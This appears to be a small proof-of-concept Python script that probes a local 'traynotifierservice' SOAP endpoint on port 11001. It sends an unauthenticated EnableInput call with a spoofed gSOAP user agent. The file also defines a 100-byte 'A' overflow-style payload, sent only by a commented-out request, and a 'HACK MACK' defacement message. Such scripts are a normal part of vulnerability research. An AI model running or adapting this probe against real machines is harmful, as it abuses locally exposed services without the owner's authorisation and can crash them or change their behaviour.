#!/usr/bin/python

import requests
import json
import html

TrayIconUrl="http://localhost:11001/traynotifierservice"
header={"User-Agent":"gSOAP/2.7",
	"Content-Type":"text/xml; charset=utf-8",
	"SOAPAction":""
	}

payload=100*"\x41"
html_msg="<html><body><h1>HACK MACK...<br> HACK MACK....</body></html>"

SOAPMsg='<?xml version="1.0" encoding="UTF-8"?> \
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body> \
<traynotifierservice:EnableInput> \
</traynotifierservice:EnableInput> \
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>'

try:
	r=requests.post(TrayIconUrl, data=SOAPMsg.encode(), headers=header)
#	r=requests.get(TrayIconUrl, params=payload, headers=header, timeout=60.0)
except requests.exceptions.RequestException as err:
	print("[-] Error...")
	print(err)
try:
	print(r)
	print(r.text)
except NameError as err:
	print("[-] Error...")
	print(err)
